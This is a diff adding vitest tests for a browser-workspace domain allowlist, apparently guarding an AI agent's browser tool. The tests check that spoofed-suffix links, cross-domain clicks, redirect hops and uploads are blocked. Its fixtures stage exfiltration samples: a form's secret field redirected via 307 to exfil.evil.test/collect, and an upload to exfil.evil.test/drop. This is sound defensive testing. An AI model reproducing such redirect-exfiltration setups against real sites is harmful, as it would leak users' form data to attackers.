@@ -4,8 +4,11 @@
  * the real JSDOM workspace form-submit path are exercised — no mock stands in
  * for the system under test. Covers allow/block/require_confirmation verdicts,
  * fail-closed evaluation for throwing and malformed policies, unknown-domain
- * fail-closed behavior, nested batch step gating, and submit interception at
- * the resolved submit URL.
+ * fail-closed behavior, nested batch step gating, confirmed-upload gating, and
+ * interception at every resolved URL — the form's submit action, an anchor's
+ * href, and each redirect hop. Redirects are driven deterministically through
+ * the workspace's own network-route mechanism (a routed 302/307 response),
+ * so no live network is involved.
  */
 
 import { afterEach, describe, expect, it, vi } from "vitest";
@@ -402,5 +405,306 @@ describe("workspace form submit interception", () => {
     } finally {
       await __resetBrowserWorkspaceStateForTests();
     }
+  });
+});
+
+describe("resolved-URL navigation and redirect interception", () => {
+  const webEnv: NodeJS.ProcessEnv = {};
+
+  async function openSeededTab(
+    routes: {
+      url: string;
+      body: string;
+      status?: number;
+      headers?: Record<string, string>;
+    }[],
+    startUrl: string,
+  ) {
+    const {
+      __resetBrowserWorkspaceStateForTests,
+      executeBrowserWorkspaceCommand,
+      openBrowserWorkspaceTab,
+    } = await import("../workspace/browser-workspace.js");
+    await __resetBrowserWorkspaceStateForTests();
+    const tab = await openBrowserWorkspaceTab(
+      { show: true, url: "about:blank" },
+      webEnv,
+    );
+    for (const route of routes) {
+      await executeBrowserWorkspaceCommand(
+        {
+          id: tab.id,
+          networkAction: "route",
+          responseBody: route.body,
+          responseHeaders: route.headers,
+          responseStatus: route.status,
+          subaction: "network",
+          url: route.url,
+        },
+        webEnv,
+      );
+    }
+    await executeBrowserWorkspaceCommand(
+      { id: tab.id, subaction: "navigate", url: startUrl },
+      webEnv,
+    );
+    return {
+      tab,
+      executeBrowserWorkspaceCommand,
+      reset: __resetBrowserWorkspaceStateForTests,
+    };
+  }
+
+  const linkHtml = `<!doctype html><html><head><title>Links</title></head><body>
+    <a id="same" href="/inner">Same</a>
+    <a id="spoof" href="https://evil-shop.test/x">Spoofed suffix</a>
+    <a id="sub" href="https://login.shop.test/x">Subdomain</a>
+    <a id="cross" href="https://denied.test/x">Cross</a>
+    </body></html>`;
+
+  it("blocks a denied cross-domain anchor click at the resolved href", async () => {
+    const { tab, executeBrowserWorkspaceCommand, reset } = await openSeededTab(
+      [{ url: "https://shop.test/", body: linkHtml }],
+      "https://shop.test/",
+    );
+    registerBrowserDomainPolicy(
+      createBrowserDomainAllowlistPolicy({
+        id: "nav-allowlist",
+        allowedDomains: ["shop.test"],
+        gatedEffects: ["navigate"],
+      }),
+    );
+    try {
+      await expect(
+        executeBrowserWorkspaceCommand(
+          { id: tab.id, selector: "#cross", subaction: "click" },
+          webEnv,
+        ),
+      ).rejects.toThrow(/domain policy "nav-allowlist"/);
+      // The blocked navigation must be side-effect free: the live tab state
+      // still reports the original page, and nothing was fetched from the
+      // denied domain.
+      const state = await executeBrowserWorkspaceCommand(
+        { id: tab.id, subaction: "state" },
+        webEnv,
+      );
+      expect(JSON.stringify(state)).toContain("https://shop.test/");
+      expect(JSON.stringify(state)).not.toContain("denied.test");
+    } finally {
+      await reset();
+    }
+  });
+
+  it("blocks a suffix-spoofed anchor target but allows same-domain and subdomain links", async () => {
+    const { tab, executeBrowserWorkspaceCommand, reset } = await openSeededTab(
+      [
+        { url: "https://shop.test/", body: linkHtml },
+        {
+          url: "https://shop.test/inner",
+          body: "<html><body>inner</body></html>",
+        },
+        {
+          url: "https://login.shop.test/x",
+          body: "<html><body>login</body></html>",
+        },
+      ],
+      "https://shop.test/",
+    );
+    registerBrowserDomainPolicy(
+      createBrowserDomainAllowlistPolicy({
+        id: "nav-allowlist",
+        allowedDomains: ["shop.test"],
+        gatedEffects: ["navigate"],
+      }),
+    );
+    try {
+      await expect(
+        executeBrowserWorkspaceCommand(
+          { id: tab.id, selector: "#spoof", subaction: "click" },
+          webEnv,
+        ),
+      ).rejects.toThrow(/domain policy "nav-allowlist"/);
+      const sameResult = await executeBrowserWorkspaceCommand(
+        { id: tab.id, selector: "#same", subaction: "click" },
+        webEnv,
+      );
+      expect(JSON.stringify(sameResult)).toContain("https://shop.test/inner");
+      // A subdomain of an allowlisted domain is permitted.
+      await executeBrowserWorkspaceCommand(
+        { id: tab.id, subaction: "navigate", url: "https://shop.test/" },
+        webEnv,
+      );
+      const subResult = await executeBrowserWorkspaceCommand(
+        { id: tab.id, selector: "#sub", subaction: "click" },
+        webEnv,
+      );
+      expect(JSON.stringify(subResult)).toContain("https://login.shop.test/x");
+    } finally {
+      await reset();
+    }
+  });
+
+  it("blocks a 307 form-submit redirect before the body reaches the denied target", async () => {
+    const submitHtml = `<!doctype html><html><body>
+      <form action="https://shop.test/submit" method="post">
+        <input name="secret" value="hunter2" />
+        <button id="go" type="submit">Go</button>
+      </form></body></html>`;
+    const { tab, executeBrowserWorkspaceCommand, reset } = await openSeededTab(
+      [
+        { url: "https://shop.test/", body: submitHtml },
+        {
+          url: "https://shop.test/submit",
+          body: "",
+          status: 307,
+          headers: { location: "https://exfil.evil.test/collect" },
+        },
+        { url: "https://exfil.evil.test/collect", body: "<html></html>" },
+      ],
+      "https://shop.test/",
+    );
+    registerBrowserDomainPolicy(
+      createBrowserDomainAllowlistPolicy({
+        id: "submit-allowlist",
+        allowedDomains: ["shop.test"],
+        gatedEffects: ["submit", "navigate"],
+      }),
+    );
+    try {
+      await expect(
+        executeBrowserWorkspaceCommand(
+          { id: tab.id, selector: "#go", subaction: "click" },
+          webEnv,
+        ),
+      ).rejects.toThrow(/domain policy "submit-allowlist"/);
+      // No request was ever *issued* to the denied target: the 307 hop was
+      // evaluated and rejected before it was followed, so the form body never
+      // left for exfil.evil.test.
+      const log = (await executeBrowserWorkspaceCommand(
+        { id: tab.id, networkAction: "requests", subaction: "network" },
+        webEnv,
+      )) as { value: { url: string }[] };
+      expect(log.value.length).toBeGreaterThan(0);
+      expect(
+        log.value.filter((entry) =>
+          entry.url.startsWith("https://exfil.evil.test"),
+        ),
+      ).toEqual([]);
+    } finally {
+      await reset();
+    }
+  });
+
+  it("blocks a redirect that bounces a navigation onto a denied domain", async () => {
+    const { tab, executeBrowserWorkspaceCommand, reset } = await openSeededTab(
+      // Routes match by substring with the most recently registered winning,
+      // so the more specific /bounce route is registered last.
+      [
+        { url: "https://shop.test/", body: linkHtml },
+        { url: "https://denied.test/landing", body: "<html></html>" },
+        {
+          url: "https://shop.test/bounce",
+          body: "",
+          status: 302,
+          headers: { location: "https://denied.test/landing" },
+        },
+      ],
+      "https://shop.test/",
+    );
+    registerBrowserDomainPolicy(
+      createBrowserDomainAllowlistPolicy({
+        id: "nav-allowlist",
+        allowedDomains: ["shop.test"],
+        gatedEffects: ["navigate"],
+      }),
+    );
+    try {
+      await executeBrowserWorkspaceCommand(
+        { id: tab.id, subaction: "navigate", url: "https://shop.test/bounce" },
+        webEnv,
+      );
+      // The document load is lazy; the redirect hop is taken (and rejected) on
+      // the first command that materializes the page.
+      await expect(
+        executeBrowserWorkspaceCommand(
+          { id: tab.id, subaction: "snapshot" },
+          webEnv,
+        ),
+      ).rejects.toThrow(/domain policy "nav-allowlist"/);
+    } finally {
+      await reset();
+    }
+  });
+});
+
+describe("policy evaluation robustness", () => {
+  it("blocks when a policy returns a non-decision value instead of throwing", () => {
+    registerBrowserDomainPolicy({
+      id: "null-returner",
+      evaluate: (() => null) as unknown as BrowserDomainPolicy["evaluate"],
+    });
+    const decision = evaluateBrowserDomainPolicies({
+      subaction: "navigate",
+      effect: "navigate",
+      domain: "example.com",
+      url: "https://example.com/",
+      targetId: null,
+      phase: "dispatch",
+    });
+    expect(decision.verdict).toBe("block");
+    expect(decision.policyId).toBe("null-returner");
+  });
+
+  it("supplies a reason when a blocking policy omits one", () => {
+    registerBrowserDomainPolicy({
+      id: "terse",
+      evaluate: (() => ({
+        verdict: "block",
+      })) as unknown as BrowserDomainPolicy["evaluate"],
+    });
+    const decision = evaluateBrowserDomainPolicies({
+      subaction: "navigate",
+      effect: "navigate",
+      domain: "example.com",
+      url: "https://example.com/",
+      targetId: null,
+      phase: "dispatch",
+    });
+    expect(decision.verdict).toBe("block");
+    expect(decision.reason).toMatch(/terse/);
+  });
+});
+
+describe("confirmed upload policy gating", () => {
+  it("blocks a denied-domain confirmed upload before the confirmation is consumed", async () => {
+    const service = new BrowserService({} as never);
+    const consumed: string[] = [];
+    registerBrowserDomainPolicy(
+      createBrowserDomainAllowlistPolicy({
+        id: "upload-allowlist",
+        allowedDomains: ["shop.test"],
+        gatedEffects: ["upload"],
+      }),
+    );
+    await expect(
+      service.executeConfirmedUpload(
+        {
+          subaction: "upload",
+          url: "https://exfil.evil.test/drop",
+        } as never,
+        {
+          actionId: "action-1",
+          requestedAt: new Date().toISOString(),
+          confirmationGrant: {} as never,
+          confirmationGrantConsumer: (() => {
+            consumed.push("consumed");
+            return {} as never;
+          }) as never,
+          session: { adapterId: "workspace" } as never,
+          capabilities: {} as never,
+        },
+      ),
+    ).rejects.toThrow(/domain policy "upload-allowlist"/);
+    expect(consumed).toEqual([]);
   });
 });
